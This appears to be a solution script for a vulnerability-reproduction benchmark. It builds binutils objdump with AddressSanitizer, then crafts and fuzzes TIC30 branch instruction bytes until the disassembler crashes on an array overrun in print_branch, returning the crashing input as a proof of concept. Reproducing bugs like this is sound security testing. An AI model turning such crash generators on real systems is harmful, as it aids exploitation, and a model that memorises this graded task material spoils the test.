import sys
import os
import tarfile
import subprocess
import tempfile
import shutil
import glob
import re
import struct
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=work_dir)
            
            src_root = work_dir
            for root, dirs, files in os.walk(work_dir):
                if "configure" in files and "opcodes" in dirs:
                    src_root = root
                    break
            
            # 2. Extract potential vulnerable opcodes from tic30-dis.c
            opcodes = []
            tic30_path = None
            for root, dirs, files in os.walk(src_root):
                if "tic30-dis.c" in files:
                    tic30_path = os.path.join(root, "tic30-dis.c")
                    break
            
            if tic30_path:
                with open(tic30_path, "r", errors="ignore") as f:
                    data = f.read()
                    # Look for entries in tic30_opcode_table pointing to print_branch
                    # Expected format: { "name", opcode, mask, print_branch, ... }
                    matches = re.findall(r'\{\s*"[^"]+"\s*,\s*(0x[0-9a-fA-F]+)\s*,\s*(0x[0-9a-fA-F]+)\s*,\s*print_branch', data)
                    for op_str, mask_str in matches:
                        opcodes.append((int(op_str, 16), int(mask_str, 16)))
            
            if not opcodes:
                # Fallback to standard TIC30 branch opcodes if parsing fails
                # BR (0x60...), Bcond (0x68...), CALL (0x70...)
                opcodes = [
                    (0x60000000, 0xF0000000),
                    (0x68000000, 0xF8000000),
                    (0x70000000, 0xF0000000)
                ]

            # 3. Build objdump with ASAN
            build_dir = os.path.join(work_dir, "build")
            os.makedirs(build_dir, exist_ok=True)
            
            env = os.environ.copy()
            flags = "-g -O1 -fsanitize=address"
            env["CFLAGS"] = flags
            env["CXXFLAGS"] = flags
            env["LDFLAGS"] = flags
            
            # Configure targeting TIC30
            subprocess.run(
                [os.path.join(src_root, "configure"), "--target=tic30-unknown-coff", 
                 "--disable-nls", "--disable-werror", "--disable-gdb", "--disable-sim", 
                 "--disable-libdecnumber", "--disable-readline"],
                cwd=build_dir, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            # Compile binutils (includes objdump)
            subprocess.run(
                ["make", "-j8", "all-binutils"],
                cwd=build_dir, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            # Find objdump binary
            objdump = os.path.join(build_dir, "binutils", "objdump")
            if not os.path.exists(objdump):
                found = glob.glob(os.path.join(build_dir, "binutils", "objdump*"))
                if found:
                    objdump = found[0]
                else:
                    # Check libtool directory
                    found = glob.glob(os.path.join(build_dir, "binutils", ".libs", "objdump*"))
                    if found: objdump = found[0]

            if not os.path.exists(objdump):
                return b""

            # 4. Fuzz/Generate PoC
            poc_path = os.path.join(work_dir, "poc.bin")
            
            def check_crash(payload):
                with open(poc_path, "wb") as f:
                    f.write(payload)
                try:
                    # Run objdump on the binary file
                    subprocess.run(
                        [objdump, "-D", "-b", "binary", "-m", "tic30", poc_path],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
                    )
                    return False
                except subprocess.CalledProcessError:
                    return True

            # Heuristic strategy:
            # The vulnerability is an array overrun in print_branch operands.
            # This usually happens when the instruction bits are crafted to imply maximum operands.
            # Try setting all variable bits to 1.
            
            for op, mask in opcodes:
                inv_mask = (~mask) & 0xFFFFFFFF
                
                # Pattern: All 1s in variable fields
                val = op | inv_mask
                
                # Try Big Endian
                b = struct.pack(">I", val)
                if check_crash(b): return b
                
                # Try Little Endian
                b = struct.pack("<I", val)
                if check_crash(b): return b
                
                # Try with padding to match ground truth 10 bytes length
                b_pad = struct.pack(">I", val) + b'\x00' * 6
                if check_crash(b_pad): return b_pad
            
            # Random fuzzing strategy if heuristics fail
            start_time = time.time()
            while time.time() - start_time < 60:
                op, mask = random.choice(opcodes)
                inv_mask = (~mask) & 0xFFFFFFFF
                rand_bits = random.getrandbits(32) & inv_mask
                val = op | rand_bits
                
                b = struct.pack(">I", val)
                if check_crash(b): return b
                
                b = struct.pack("<I", val)
                if check_crash(b): return b
                
                # Occasional 10 byte try
                if random.random() < 0.2:
                    b = b + os.urandom(6)
                    if check_crash(b): return b

            return b""

        except Exception:
            return b""
        finally:
            shutil.rmtree(work_dir)